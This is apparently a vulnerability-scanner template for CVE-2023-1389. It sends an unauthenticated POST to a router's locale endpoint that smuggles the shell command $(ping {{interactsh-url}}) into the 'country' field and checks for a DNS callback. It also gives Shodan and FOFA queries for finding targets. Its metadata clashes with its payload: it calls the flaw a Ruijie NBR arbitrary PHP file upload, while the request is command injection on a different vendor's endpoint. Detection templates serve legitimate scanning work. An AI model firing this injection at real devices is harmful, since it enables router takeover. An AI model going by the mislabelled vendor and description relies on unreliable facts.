id: CVE-2023-1389

info:
  name: Ruijie NBR - Arbitrary File Upload
  author: Co5mos
  severity: high
  description: |
    Ruijie NBR series routers have an arbitrary file upload vulnerability that allows attackers to construct malicious requests to upload and execute arbitrary PHP files, leading to arbitrary code execution on affected devices. This usually results in full system control.
  classification:
    cvss-metrics: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 8.8
    cve-id: CVE-2023-1389
    cwe-id: CWE-77
  metadata:
    fofa-query: app="Ruijie-NBR路由器"
    shodan-query: title:"ruijie"
    max-request: 2
    vendor: Ruijie
    product: NBR Router
  tags: cve,cve2023,ruijie,router,arbitrary-file-upload

http:
  - raw:
        - |
          POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          operation=write&country=$(ping {{interactsh-url}})

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
